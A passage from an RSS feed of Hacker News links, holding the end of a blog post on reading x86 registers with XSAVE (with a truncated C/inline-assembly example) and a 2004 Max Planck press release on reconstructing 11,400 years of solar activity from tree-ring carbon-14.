    <td><abbr title="Higher 128 bits of YMM0..YMM15 registers (lower 128 bits overlap with XMM registers)">YMM_Hi128</abbr><br><small>(256 bytes)</small></td>
  </tr>
  <tr>
    <td rowspan="2">unused (<abbr title="Memory Protection Extensions">MPX</abbr> +
    <abbr title="Advanced Vector Extensions">AVX</abbr>-512)<br><small>(1680 bytes)</small></td>
    <td><abbr title="Processor Trace extensions">PT</abbr><br><small>(72 bytes)</small></td>
  </tr>
  <tr>
    <td rowspan="2">(not allocated)</td>
  </tr>
  <tr>
    <td><abbr title="Processor Trace extensions">PT</abbr><br><small>(72 bytes)</small></td>
  </tr>
</tbody></table>

<h2 id="invoking-xsave">Invoking XSAVE</h2>

<p>There are a few preliminary steps that need to be done before invoking
any of the <code>XSAVE</code> family of instructions.  I will shortly list them
now.</p>

<p>Firstly, the support for the instruction needs to be verified
via <code>CPUID</code>.  Strictly speaking, the same is also true for <code>FXSAVE</code>.</p>

<p>Secondly, the state tracking needs to be enabled.  This means setting
appropriate state component bits in XCR0 for user state components,
and in IA32_XSS for supervisor state components.  The appropriate XSAVE
bit also needs to be set in the Control Register CR4.  All of this
is done by the kernel.</p>

<p>Thirdly, a buffer large enough for the XSAVE Area needs to be obtained.
The program should use <code>CPUID</code> instruction to obtain the needed
size.  The buffer needs to be aligned to 64 bytes.  Usually, it may
be convenient to zero the buffer first, to avoid having to be careful
e.g. about <code>XSAVE</code> leaving unused XSTATE_BV bytes unmodified.</p>

<p>Finally, the requested state component bitmap needs to be put into
the register pair EDX:EAX (the higher 32 bits into EDX, lower into EAX
‚Äî this is a common i386 convention for 64-bit integers).  Once this
is done, <code>XSAVE</code> can be invoked.</p>

<p>Afterwards, another series of <code>CPUID</code> calls are necessary to obtain
offsets or sizes and alignment requirements to process the contents
of the XSAVE Area.</p>

<p>The listing below presents a simple program that calls <code>XSAVE</code> three
times with different register sets modified.</p>

<pre><code>#include &lt;assert.h&gt;
#include &lt;inttypes.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

struct xsave {
    uint8_t legacy_area[512];
    union {
        struct {
            uint64_t xstate_bv;
            uint64_t xcomp_bv;
        };
        uint8_t header_area[64];
    };
    uint8_t extended_area[];
};

int main() {
    uint32_t buf_size = 0;
    uint32_t avx_offset = 0;
    uint8_t avx_bytes[32];
    struct xsave* buf[3];
    int i;
    for (i = 0; i &lt; sizeof(avx_bytes); ++i)
        avx_bytes[i] = i;

    __asm__ __volatile__ (
        /* check CPUID support for XSAVE and AVX */
        "mov $0x01, %%eax\n\t"
        "cpuid\n\t"
        "mov $0x04000000, %%eax\n\t"  /* bit 26 - XSAVE */
        "and %%ecx, %%eax\n\t"
        "jz .cpuid_end\n\t"
        "mov $0x10000000, %%eax\n\t"  /* bit 28 - AVX */
        "and %%ecx, %%eax\n\t"
        "jz .no_avx\n\t"
        /* get AVX offset */
        "mov $0x0d, %%eax\n\t"
        "mov $0x02, %%ecx\n\t"
        "cpuid\n\t"
        "mov %%ebx, %1\n\t"
        "\n"
        ".no_avx:\n\t"
        /* get XSAVE area size for current XCR0 */
        "mov $0x0d, %%eax\n\t"
        "xor %%ecx, %%ecx\n\t"
        "cpuid\n\t"
        "mov %%ebx, %0\n\t"
        "\n"
        ".cpuid_end:\n\t"
        : "=m"(buf_size), "=m"(avx_offset)
        :
        : "%eax", "%ebx", "%ecx", "%edx"
    );

    if (buf_size == 0) {
        printf("no xsave support\n");
        return 1;
    }

    printf("has avx: %s\n", ‚Ä¶</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-2/">https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-2/</a></em></p>]]>
            </description>
            <link>https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937023</guid>
            <pubDate>Thu, 29 Oct 2020 22:46:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Sun is more active now than over the last 8000 years (2004)]]>
            </title>
            <description>
<![CDATA[
Score 46 | Comments 19 (<a href="https://news.ycombinator.com/item?id=24937001">thread link</a>) | @firebaze
<br/>
October 29, 2020 | https://www.mpg.de/research/sun-activity-high | <a href="https://web.archive.org/web/*/https://www.mpg.de/research/sun-activity-high">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  
  
  <p>An international team of scientists has reconstructed the Sun's activity over the last 11 millennia and forecasts decreased activity within a few decades</p>
  

  

  <p>The activity of the Sun over the last 11,400 years, i.e., back to the end of the last ice age on Earth, has now for the first time been reconstructed quantitatively by an international group of researchers led by Sami K. Solanki from the Max Planck Institute for Solar System Research (Katlenburg-Lindau, Germany). The scientists have analyzed the radioactive isotopes in trees that lived thousands of years ago. As the scientists from Germany, Finland, and Switzerland report in the current issue of the science journal "Nature" from October 28, one needs to go back over 8,000 years in order to find a time when the Sun was, on average, as active as in the last 60 years. Based on a statistical study of earlier periods of increased solar activity, the researchers predict that the current level of high solar activity will probably continue only for a few more decades.</p>
  
  
<figure data-description="A large sunspot observed on the Sun in early September 2004. The field of view encompasses around 45,000 by 30,000 km of the Sun‚Äôs surface - the entire earth would fit into the area several times over. Sunspots appear dark because the strong magnetic field in the them suppresses the transport of energy through gas flow. In the central dark area of the sunspot (umbra) the magnetic field is perpendicular to the surface, whereas in the lighter coloured periphery (penumbra) the magnetic field is largely horizontal to the surface. The image was captured by Vasily Zakharov with a one-meter solar telescope on the island of La Palma. The telescope is operated by the Institute for Solar Physics of the Royal Swedish Academy of Sciences." data-picture="base64;PHBpY3R1cmUgY2xhc3M9IiIgZGF0YS1pZXNyYz0iLzExNTcwNjk1L29yaWdpbmFsLTE1NjE0NDUwOTguanBlZz90PWV5SjNhV1IwYUNJNk1UUXdNQ3dpYjJKcVgybGtJam94TVRVM01EWTVOWDA9LS02YTE5YTU1MDA4NDA0MzE3Y2MyNTJmNjE3MDQ5ZmRhZmMzYThiMmU5IiBkYXRhLWFsdD0ib3JpZ2luYWwiIGRhdGEtY2xhc3M9IiI+PHNvdXJjZSBtZWRpYT0iKG1heC13aWR0aDogNzY3cHgpIiBzcmNzZXQ9Ii8xMTU3MDY5NS9vcmlnaW5hbC0xNTYxNDQ1MDk4LmpwZWc/dD1leUozYVdSMGFDSTZOREUwTENKdlltcGZhV1FpT2pFeE5UY3dOamsxZlE9PS0tNTBiOTlmOTgyZjA3YTA0ZDI2NGU0NWUzOWIwODk1YTMzMzVkYmE5MSA0MTR3LCAvMTE1NzA2OTUvb3JpZ2luYWwtMTU2MTQ0NTA5OC5qcGVnP3Q9ZXlKM2FXUjBhQ0k2TXpjMUxDSnZZbXBmYVdRaU9qRXhOVGN3TmprMWZRPT0tLTdlNGIwNDNlZDdmNWVjOTVmZTdmYmY5NzQ2MjVjMTAyMWFhZGIxYjYgMzc1dywgLzExNTcwNjk1L29yaWdpbmFsLTE1NjE0NDUwOTguanBlZz90PWV5SjNhV1IwYUNJNk16SXdMQ0p2WW1wZmFXUWlPakV4TlRjd05qazFmUT09LS0wY2EyMTliMWYyZDA4MGEwNWVlMzJhN2NiNWJlMzI4MzA5NGNlNTNjIDMyMHcsIC8xMTU3MDY5NS9vcmlnaW5hbC0xNTYxNDQ1MDk4LmpwZWc/dD1leUozYVdSMGFDSTZOREV4TENKdlltcGZhV1FpT2pFeE5UY3dOamsxZlE9PS0tOTU1NGJiZTNlZjUzZTkzYzEyMjQ4OGUxMGNjNWM4NjM0NDljYjU5ZSA0MTF3LCAvMTE1NzA2OTUvb3JpZ2luYWwtMTU2MTQ0NTA5OC5qcGVnP3Q9ZXlKM2FXUjBhQ0k2TkRnd0xDSnZZbXBmYVdRaU9qRXhOVGN3TmprMWZRPT0tLTI0MTZjYjExZTEyZDBjMTUxZGMwM2Q4NDZjZGE5ZDdjMjY2MjM4ZDkgNDgwdywgLzExNTcwNjk1L29yaWdpbmFsLTE1NjE0NDUwOTguanBlZz90PWV5SjNhV1IwYUNJNk16WXdMQ0p2WW1wZmFXUWlPakV4TlRjd05qazFmUT09LS0xMTFmODVhODA5YTZiOThmNDY1NDc0YTQxNDE5MzNmMzYyM2UzOWM0IDM2MHcsIC8xMTU3MDY5NS9vcmlnaW5hbC0xNTYxNDQ1MDk4LmpwZWc/dD1leUozYVdSMGFDSTZPREk0TENKdlltcGZhV1FpT2pFeE5UY3dOamsxZlE9PS0tZDE0N2VlZDFkZjA2ZTg5NzhhY2NlZDBiMzZmMDFhZDZjOTU1NDI1MCA4Mjh3LCAvMTE1NzA2OTUvb3JpZ2luYWwtMTU2MTQ0NTA5OC5qcGVnP3Q9ZXlKM2FXUjBhQ0k2TnpVd0xDSnZZbXBmYVdRaU9qRXhOVGN3TmprMWZRPT0tLTE2MGFjZmQwMDI1YWJkMDhhMDY2ZDVkMzgxZDllMGY4YzM1MzI1MWMgNzUwdywgLzExNTcwNjk1L29yaWdpbmFsLTE1NjE0NDUwOTguanBlZz90PWV5SjNhV1IwYUNJNk5qUXdMQ0p2WW1wZmFXUWlPakV4TlRjd05qazFmUT09LS1lMTZjMDlmZjU0NTFiYjNmNzEzM2Y3ZmM0Mjg1Y2JhMThhNDA4YzJiIDY0MHcsIC8xMTU3MDY5NS9vcmlnaW5hbC0xNTYxNDQ1MDk4LmpwZWc/dD1leUozYVdSMGFDSTZPREl5TENKdlltcGZhV1FpT2pFeE5UY3dOamsxZlE9PS0tZDA5Mzc1OGQwN2MzMTYzOWFiYTQ1Yzg3YTg4M2NmMWM4YmIyM2Y0ZCA4MjJ3LCAvMTE1NzA2OTUvb3JpZ2luYWwtMTU2MTQ0NTA5OC5qcGVnP3Q9ZXlKM2FXUjBhQ0k2T1RZd0xDSnZZbXBmYVdRaU9qRXhOVGN3TmprMWZRPT0tLTE2YjMzOWMzZmI3OWE3MGQwNzE1YWUzNDlmZjNhNjE5YzMyNDRlYzUgOTYwdywgLzExNTcwNjk1L29yaWdpbmFsLTE1NjE0NDUwOTguanBlZz90PWV5SjNhV1IwYUNJNk56SXdMQ0p2WW1wZmFXUWlPakV4TlRjd05qazFmUT09LS1lZmE4M2ZkNjQyYjIxODQ2NDEwZDQ4YjUwZmQ1M2Q5OWQ2YWIzODRjIDcyMHciIHNpemVzPSIxMDB2dyIgLz48c291cmNlIG1lZGlhPSIobWluLXdpZHRoOiA3NjhweCkgYW5kIChtYXgtd2lkdGg6IDk5MXB4KSIgc3Jjc2V0PSIvMTE1NzA2OTUvb3JpZ2luYWwtMTU2MTQ0NTA5OC5qcGVnP3Q9ZXlKM2FXUjBhQ0k2T1RBd0xDSnZZbXBmYVdRaU9qRXhOVGN3TmprMWZRPT0tLTkwYzBmODI5ZjIyM2I5MTMyMDIxMTEyYWQzYWJkM2MyYTgyNDY2MjggOTAwdywgLzExNTcwNjk1L29yaWdpbmFsLTE1NjE0NDUwOTguanBlZz90PWV5SjNhV1IwYUNJNk1UZ3dNQ3dpYjJKcVgybGtJam94TVRVM01EWTVOWDA9LS1hM2Q3Yzc4NDNkMjg0NWQ4YTZhNWRmMzY1OTE1Mzc2YmZiNzY5MmJmIDE4MDB3IiBzaXplcz0iOTAwcHgiIC8+PHNvdXJjZSBtZWRpYT0iKG1pbi13aWR0aDogOTkycHgpIGFuZCAobWF4LXdpZHRoOiAxMTk5cHgpIiBzcmNzZXQ9Ii8xMTU3MDY5NS9vcmlnaW5hbC0xNTYxNDQ1MDk4LmpwZWc/dD1leUozYVdSMGFDSTZNVEl3TUN3aWIySnFYMmxrSWpveE1UVTNNRFk1TlgwPS0tYjk3Mjc1NGE2NjM1YmZhOTg5YzdlNGI4N2NjODIxYWYxZjU3MmUzYiAxMjAwdywgLzExNTcwNjk1L29yaWdpbmFsLTE1NjE0NDUwOTguanBlZz90PWV5SjNhV1IwYUNJNk1qUXdNQ3dpYjJKcVgybGtJam94TVRVM01EWTVOWDA9LS1hYTQ4ODlkODBhZWQ3MDMyNGEzZWFiMjUxZGQ3NzBiNjQzNWQ1NDJjIDI0MDB3IiBzaXplcz0iMTIwMHB4IiAvPjxzb3VyY2UgbWVkaWE9IihtaW4td2lkdGg6IDEyMDBweCkiIHNyY3NldD0iLzExNTcwNjk1L29yaWdpbmFsLTE1NjE0NDUwOTguanBlZz90PWV5SjNhV1IwYUNJNk1UUXdNQ3dpYjJKcVgybGtJam94TVRVM01EWTVOWDA9LS02YTE5YTU1MDA4NDA0MzE3Y2MyNTJmNjE3MDQ5ZmRhZmMzYThiMmU5IDE0MDB3LCAvMTE1NzA2OTUvb3JpZ2luYWwtMTU2MTQ0NTA5OC5qcGVnP3Q9ZXlKM2FXUjBhQ0k2TWpnd01Dd2liMkpxWDJsa0lqb3hNVFUzTURZNU5YMD0tLThhZDJkYzA4MmUzODIyMzFjYzk3N2VlOTU5NmU4YTNmMDNlNjE5NGIgMjgwMHciIHNpemVzPSIxNDAwcHgiIC8+PGltZyBjbGFzcz0iIiB0aXRsZT0iQSBsYXJnZSBzdW5zcG90IG9ic2VydmVkIG9uIHRoZSBTdW4gaW4gZWFybHkgU2VwdGVtYmVyIDIwMDQuIFRoZSBmaWVsZCBvZiB2aWV3IGVuY29tcGFzc2VzIGFyb3VuZCA0NSwwMDAgYnkgMzAsMDAwIGttIG9mIHRoZSBTdW7igJlzIHN1cmZhY2UgLSB0aGUgZW50aXJlIGVhcnRoIHdvdWxkIGZpdCBpbnRvIHRoZSBhcmVhIHNldmVyYWwgdGltZXMgb3Zlci4gU3Vuc3BvdHMgYXBwZWFyIGRhcmsgYmVjYXVzZSB0aGUgc3Ryb25nIG1hZ25ldGljIGZpZWxkIGluIHRoZSB0aGVtIHN1cHByZXNzZXMgdGhlIHRyYW5zcG9ydCBvZiBlbmVyZ3kgdGhyb3VnaCBnYXMgZmxvdy4gSW4gdGhlIGNlbnRyYWwgZGFyayBhcmVhIG9mIHRoZSBzdW5zcG90ICh1bWJyYSkgdGhlIG1hZ25ldGljIGZpZWxkIGlzIHBlcnBlbmRpY3VsYXIgdG8gdGhlIHN1cmZhY2UsIHdoZXJlYXMgaW4gdGhlIGxpZ2h0ZXIgY29sb3VyZWQgcGVyaXBoZXJ5IChwZW51bWJyYSkgdGhlIG1hZ25ldGljIGZpZWxkIGlzIGxhcmdlbHkgaG9yaXpvbnRhbCB0byB0aGUgc3VyZmFjZS4gVGhlIGltYWdlIHdhcyBjYXB0dXJlZCBieSBWYXNpbHkgWmFraGFyb3Ygd2l0aCBhIG9uZS1tZXRlciBzb2xhciB0ZWxlc2NvcGUgb24gdGhlIGlzbGFuZCBvZiBMYSBQYWxtYS4gVGhlIHRlbGVzY29wZSBpcyBvcGVyYXRlZCBieSB0aGUgSW5zdGl0dXRlIGZvciBTb2xhciBQaHlzaWNzIG9mIHRoZSBSb3lhbCBTd2VkaXNoIEFjYWRlbXkgb2YgU2NpZW5jZXMuIiBzcmM9Ii8xMTU3MDY5NS9vcmlnaW5hbC0xNTYxNDQ1MDk4LmpwZWc/dD1leUozYVdSMGFDSTZNVFF3TUN3aWIySnFYMmxrSWpveE1UVTNNRFk1TlgwPS0tNmExOWE1NTAwODQwNDMxN2NjMjUyZjYxNzA0OWZkYWZjM2E4YjJlOSIgLz48L3BpY3R1cmU+">
      
    

    
    <figcaption>
        <p>
          A large sunspot observed on the Sun in early September 2004. The field of view encompasses around 45,000 by 30,000 km of the Sun‚Äôs surface - the entire earth would fit into the area several times over. Sunspots appear dark because the strong magnetic field in the them suppresses the transport of energy through gas flow. In the central dark area of the sunspot (umbra) the magnetic field is perpendicular to the surface, whereas in the lighter coloured periphery (penumbra) the magnetic field is largely horizontal to the surface. The image was captured by Vasily Zakharov with a one-meter solar telescope on the island of La Palma. The telescope is operated by the Institute for Solar Physics of the Royal Swedish Academy of Sciences.
        </p>
        <p>
          ¬© Max Planck Institute for Solar System Research
        </p>
    </figcaption>
</figure>


<p>The research team had already in 2003 found evidence that the Sun is more active now than in the previous 1000 years. A new data set has allowed them to extend the length of the studied period of time to 11,400 years, so that the whole length of time since the last ice age could be covered. This study showed that the current episode of high solar activity since about the year 1940 is unique within the last 8000 years. This means that the Sun has produced more sunspots, but also more flares and eruptions, which eject huge gas clouds into space, than in the past. The origin and energy source of all these phenomena is the Sun's magnetic field.</p>

<p>Since the invention of the telescope in the early 17th century, astronomers have observed sunspots on a regular basis. These are regions on the solar surface where the energy supply from the solar interior is reduced owing to the strong magnetic fields that they harbour. As a consequence, sunspots are cooler by about 1,500 degrees and appear dark in comparison to their non-magnetic surroundings at an average temperature of 5,800 degrees. The number of sunspots visible on the solar surface varies with the 11-year activity cycle of the Sun, which is modulated by long-term variations. For example, there were almost no sunspots seen during the second half of the 17th century.</p>

<p>For many studies concerning the origin of solar activity and its potential effect on long-term variations of Earth's climate, the interval of time since the year 1610, for which systematic records of sunspots exist, is much too short. For earlier times the level of solar activity must be derived from other data. Such information is stored on Earth in the form of "cosmogenic" isotopes. These are radioactive nuclei resulting from collisions of energetic cosmic ray particles with air molecules in the upper atmosphere. One of these isotopes is C-14, radioactive carbon with a half life of 5730 years, which is well known from the C-14 method to determine the age of wooden objects. The amount of C-14 produced depends strongly on the number of cosmic ray particles that reach the atmosphere. This number, in turn, varies with the level of solar activity: during times of high activity, the solar magnetic field provides an effective shield against these energetic particles, while the intensity of the cosmic rays increases when the activity is low. Therefore, higher solar activity leads to a lower production rate of C-14, and vice versa.</p>

<p>By mixing processes in the atmosphere, the C-14 produced by cosmic rays reaches the biosphere and part of it is incorporated in the biomass of trees. Some tree trunks can be recovered from below the ground thousands of years after their death and the content of C-14 stored in their tree rings can be measured. The year in which the C-14 had been incorporated is determined by comparing different trees with overlapping life spans. In this way, one can measure the production rate of C-14 backward in time over 11,400 years, right to the end of the last ice age. The research group have used these data to calculate the variation of the number of sunspots over these 11,400 years. The number of sunspots is a good measure also for the strength of the various other phenomena of solar activity.</p>

<p>The method of reconstructing solar activity in the past, which describes each link in the complex chain connecting the isotope abundances with the sunspot number with consistent quantitative physical models, has been tested and gauged by comparing the historical record of directly measured sunspot numbers with earlier shorter reconstructions on the basis of the cosmogenic isotope Be-10 in the polar ice shields. The models concern the production of the isotopes by cosmic rays, the modulation of the cosmic ray flux by the interplanetary magnetic field (the open solar magnetic flux), as well as the relation between the large-scale solar magnetic field and the sunspot number. In this way, for the first time a quantitatively reliable reconstruction of the sunspot number for the whole time since the end of the last ice age could be obtained.</p>
<figure data-description="Top: Reconstructed sunspot activity (10 year average) for the last 11,400 years based on C-14 data (blue curve) and the directly observed historical sunspot data since 1610 (red curve). The reliable C-14 data ends around the year 1900 so that the sharp increase in sunspot activity in the 20th century does not appear in the graph. The reconstruction shows clearly that a comparable period of high sunspot activity previously existed over 8000 years ago. Below: An enlarged section of the upper graph (hatched area) with several episodes of higher sun activity; comparable to the 20th century." data-picture="base64;PHBpY3R1cmUgY2xhc3M9Im1vYmlsZS1maWxsLWhlaWdodCB0YWJsZXQtZmlsbC1oZWlnaHQgZGVza3RvcC1maWxsLWhlaWdodCBsYXJnZS1maWxsLWhlaWdodCIgZGF0YS1pZXNyYz0iLzExNTY5ODk0L29yaWdpbmFsLTE1MDgxNTU1MjEuZ2lmP3Q9ZXlKM2FXUjBhQ0k2TVRRd01Dd2liMkpxWDJsa0lqb3hNVFUyT1RnNU5IMD0tLWU4NzU5N2Q3MDFkOGZmYmEzNmMzOTY5OWY0Yjc5MGMyYTRlNWI2NmYiIGRhdGEtYWx0PSJvcmlnaW5hbCIgZGF0YS1jbGFzcz0iIj48c291cmNlIG1lZGlhPSIobWF4LXdpZHRoOiA3NjdweCkiIHNyY3NldD0iLzExNTY5ODk0L29yaWdpbmFsLTE1MDgxNTU1MjEuZ2lmP3Q9ZXlKM2FXUjBhQ0k2TkRFMExDSnZZbXBmYVdRaU9qRXhOVFk1T0RrMGZRPT0tLWI2ZTIwNTlkMTRmNzdjMjgxYzA2MjY4YTBlNDc0ODYxMjMyOWUzNDUgNDE0dywgLzExNTY5ODk0L29yaWdpbmFsLTE1MDgxNTU1MjEuZ2lmP3Q9ZXlKM2FXUjBhQ0k2TXpjMUxDSnZZbXBmYVdRaU9qRXhOVFk1T0RrMGZRPT0tLTBmNGNiNTE4NWI1ZGI3ZTRjZWJhMmIxMGQzNWEyZWQyMDgxYjFjMTAgMzc1dywgLzExNTY5ODk0L29yaWdpbmFsLTE1MDgxNTU1MjEuZ2lmP3Q9ZXlKM2FXUjBhQ0k2TXpJd0xDSnZZbXBmYVdRaU9qRXhOVFk1T0RrMGZRPT0tLTZlYWJlMDlkZmQ0ZjU2MDc5MmVhZWE0OGViNjVjMzBlNzg1YmZhNTEgMzIwdywgLzExNTY5ODk0L29yaWdpbmFsLTE1MDgxNTU1MjEuZ2lmP3Q9ZXlKM2FXUjBhQ0k2TkRFeExDSnZZbXBmYVdRaU9qRXhOVFk1T0RrMGZRPT0tLTk1ZmIwZWFkMTRiMTgyZWEyMjk1NGQwNTliZDhjOTI0MzBiOTkzY2MgNDExdywgLzExNTY5ODk0L29yaWdpbmFsLTE1MDgxNTU1MjEuZ2lmP3Q9ZXlKM2FXUjBhQ0k2TkRnd0xDSnZZbXBmYVdRaU9qRXhOVFk1T0RrMGZRPT0tLTQ3MTliOWI3ZGQyYzdmYWY1OGM1YzcxM2I4MGQyNTUyOThkMzA1NzkgNDgwdywgLzExNTY5ODk0L29yaWdpbmFsLTE1MDgxNTU1MjEuZ2lmP3Q9ZXlKM2FXUjBhQ0k2TXpZd0xDSnZZbXBmYVdRaU9qRXhOVFk1T0RrMGZRPT0tLWYyOTgyM2EzYzc5NzgxMGU2NjAxYzNmYzVlNGU2NTg4YjE0MTY3NjYgMzYwdywgLzExNTY5ODk0L29yaWdpbmFsLTE1MDgxNTU1MjEuZ2lmP3Q9ZXlKM2FXUjBhQ0k2T0RJNExDSnZZbXBmYVdRaU9qRXhOVFk1T0RrMGZRPT0tLTQ3N2IxYjk1OTJhODZhNzE5OTM1MWRmYjBiZjMzZWE0ZDRiMWVlYjMgODI4dywgLzExNTY5ODk0L29yaWdpbmFsLTE1MDgxNTU1MjEuZ2lmP3Q9ZXlKM2FXUjBhQ0k2TnpVd0xDSnZZbXBmYVdRaU9qRXhOVFk1T0RrMGZRPT0tLTY4ZDVkY2RiN2NmZDg0ZGQ4ODcxYmFmZTQ0ODVlMGIxZmU1MTQ0ZTQgNzUwdywgLzExNTY5ODk0L29yaWdpbmFsLTE1MDgxNTU1MjEuZ2lmP3Q9ZXlKM2FXUjBhQ0k2TmpRd0xDSnZZbXBmYVdRaU9qRXhOVFk1T0RrMGZRPT0tLWMwMzA0ZGQ4MmQwMDk4ZGYyNzY5MDA2M2U2ZGRkNGFiY2MwZjc2ZWUgNjQwdywgLzExNTY5ODk0L29yaWdpbmFsLTE1MDgxNTU1MjEuZ2lmP3Q9ZXlKM2FXUjBhQ0k2T0RJeUxDSnZZbXBmYVdRaU9qRXhOVFk1T0RrMGZRPT0tLTVkMTIxYjVlOWM5NjUyODBiY2VhMDBiYmViNGYxMTY4NzJlYWRiMTEgODIydywgLzExNTY5ODk0L29yaWdpbmFsLTE1MDgxNTU1MjEuZ2lmP3Q9ZXlKM2FXUjBhQ0k2T1RZd0xDSnZZbXBmYVdRaU9qRXhOVFk1T0RrMGZRPT0tLTBlZGViOGIxNzYyNDY4ZmRiZDFkNWE2YmE0NWE3NmQ1NWY1Yzk3ZDYgOTYwdywgLzExNTY5ODk0L29yaWdpbmFsLTE1MDgxNTU1MjEuZ2lmP3Q9ZXlKM2FXUjBhQ0k2TnpJd0xDSnZZbXBmYVdRaU9qRXhOVFk1T0RrMGZRPT0tLTZmMDc0NjQ1MTJkYTczOTdmYjE4ZWZmYTE1NjU3NGJmMDlhYjA3NjQgNzIwdyIgc2l6ZXM9IjEwMHZ3IiAvPjxzb3VyY2UgbWVkaWE9IihtaW4td2lkdGg6IDc2OHB4KSBhbmQgKG1heC13aWR0aDogOTkxcHgpIiBzcmNzZXQ9Ii8xMTU2OTg5NC9vcmlnaW5hbC0xNTA4MTU1NTIxLmdpZj90PWV5SjNhV1IwYUNJNk9UQXdMQ0p2WW1wZmFXUWlPakV4TlRZNU9EazBmUT09LS1iYTlkNTZkMzczM2QwYTI2OTk5NjQ3OWJmYzlmM2Y2NjdmMWZiNjIzIDkwMHcsIC8xMTU2OTg5NC9vcmlnaW5hbC0xNTA4MTU1NTIxLmdpZj90PWV5SjNhV1IwYUNJNk1UZ3dNQ3dpYjJKcVgybGtJam94TVRVMk9UZzVOSDA9LS1kZWI2MGMxMmU3NGE1ZDJlZGVkYmVjYTFiOWI4NzY2YTEwYjE0ZjIxIDE4MDB3IiBzaXplcz0iOTAwcHgiIC8+PHNvdXJjZSBtZWRpYT0iKG1pbi13aWR0aDogOTkycHgpIGFuZCAobWF4LXdpZHRoOiAxMTk5cHgpIiBzcmNzZXQ9Ii8xMTU2OTg5NC9vcmlnaW5hbC0xNTA4MTU1NTIxLmdpZj90PWV5SjNhV1IwYUNJNk1USXdNQ3dpYjJKcVgybGtJam94TVRVMk9UZzVOSDA9LS05ZjQ5MTYxNWJhZDQxOTkzOGZiYjlkNDA5M2M0YzhlMGFkMWZhZDZjIDEyMDB3LCAvMTE1Njk4OTQvb3JpZ2luYWwtMTUwODE1NTUyMS5naWY/dD1leUozYVdSMGFDSTZNalF3TUN3aWIySnFYMmxrSWpveE1UVTJPVGc1TkgwPS0tNjQzNGY0NjdjMDNhM2YxNjk1MzI4ZDU4ZDhhOGM3MjFhYjg1N2YyMSAyNDAwdyIgc2l6ZXM9IjEyMDBweCIgLz48c291cmNlIG1lZGlhPSIobWluLXdpZHRoOiAxMjAwcHgpIiBzcmNzZXQ9Ii8xMTU2OTg5NC9vcmlnaW5hbC0xNTA4MTU1NTIxLmdpZj90PWV5SjNhV1IwYUNJNk1UUXdNQ3dpYjJKcVgybGtJam94TVRVMk9UZzVOSDA9LS1lODc1OTdkNzAxZDhmZmJhMzZjMzk2OTlmNGI3OTBjMmE0ZTViNjZmIDE0MDB3LCAvMTE1Njk4OTQvb3JpZ2luYWwtMTUwODE1NTUyMS5naWY/dD1leUozYVdSMGFDSTZNamd3TUN3aWIySnFYMmxrSWpveE1UVTJPVGc1TkgwPS0tMDNhZGQ4MjZjM2I5NmVmZDBmNDU2YTRiMjFlOTg4MGMzYmEzMjAyMyAyODAwdyIgc2l6ZXM9IjE0MDBweCIgLz48aW1nIGNsYXNzPSIiIHRpdGxlPSJUb3A6IFJlY29uc3RydWN0ZWQgc3Vuc3BvdCBhY3Rpdml0eSAoMTAgeWVhciBhdmVyYWdlKSBmb3IgdGhlIGxhc3QgMTEsNDAwIHllYXJzIGJhc2VkIG9uIEMtMTQgZGF0YSAoYmx1ZSBjdXJ2ZSkgYW5kIHRoZSBkaXJlY3RseSBvYnNlcnZlZCBoaXN0b3JpY2FsIHN1bnNwb3QgZGF0YSBzaW5jZSAxNjEwIChyZWQgY3VydmUpLiBUaGUgcmVsaWFibGUgQy0xNCBkYXRhIGVuZHMgYXJvdW5kIHRoZSB5ZWFyIDE5MDAgc28gdGhhdCB0aGUgc2hhcnAgaW5jcmVhc2UgaW4gc3Vuc3BvdCBhY3Rpdml0eSBpbiB0aGUgMjB0aCBjZW50dXJ5IGRvZXMgbm90IGFwcGVhciBpbiB0aGUgZ3JhcGguIFRoZSByZWNvbnN0cnVjdGlvbiBzaG93cyBjbGVhcmx5IHRoYXQgYSBjb21wYXJhYmxlIHBlcmlvZCBvZiBoaWdoIHN1bnNwb3QgYWN0aXZpdHkgcHJldmlvdXNseSBleGlzdGVkIG92ZXIgODAwMCB5ZWFycyBhZ28uIEJlbG93OiBBbiBlbmxhcmdlZCBzZWN0aW9uIG9mIHRoZSB1cHBlciBncmFwaCAoaGF0Y2hlZCBhcmVhKSB3aXRoIHNldmVyYWwgZXBpc29kZXMgb2YgaGlnaGVyIHN1biBhY3Rpdml0eTsgY29tcGFyYWJsZSB0byB0aGUgMjB0aCBjZW50dXJ5LiIgc3JjPSIvMTE1Njk4OTQvb3JpZ2luYWwtMTUwODE1NTUyMS5naWY/dD1leUozYVdSMGFDSTZNVFF3TUN3aWIySnFYMmxrSWpveE1UVTJPVGc1TkgwPS0tZTg3NTk3ZDcwMWQ4ZmZiYTM2YzM5Njk5ZjRiNzkwYzJhNGU1YjY2ZiIgLz48L3BpY3R1cmU+">
      
    

    
    <figcaption>
        <p>
          Top: Reconstructed sunspot activity (10 year average) for the last 11,400 years based on C-14 data (blue curve) and the directly observed historical sunspot data since 1610 (red curve). The reliable C-14 data ends around the year 1900 so that the sharp increase in sunspot activity in the 20th century does not appear in the graph. The reconstruction shows clearly that a comparable period of high sunspot activity previously existed over 8000 years ago. Below: An enlarged section of the upper graph (hatched area) with several episodes of higher sun activity; comparable to the 20th century.
        </p>
        <p>
          ¬© Max Planck Institute for Solar System Research
        </p>
    </figcaption>
</figure>


<p>Because the brightness of the Sun varies slightly with solar activity, the new reconstruction indicates also that the Sun shines somewhat brighter today than in the 8,000 years before. Whether this effect could have provided a significant contribution to the global warming of the Earth during the last century is an open question. The researchers around Sami K. Solanki stress the fact that solar activity has remained on a roughly constant (high) level since about 1980 - apart from the variations due to the 11-year cycle - while the global temperature has experienced a strong further increase during that time. On the other hand, the rather similar trends of solar activity and terrestrial temperature during the last centuries (with the notable exception of the last 20 years) indicates that the relation between the Sun and climate remains a challenge for further research.</p>
  
</div></div>]]>
            </description>
            <link>https://www.mpg.de/research/sun-activity-high</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937001</guid>
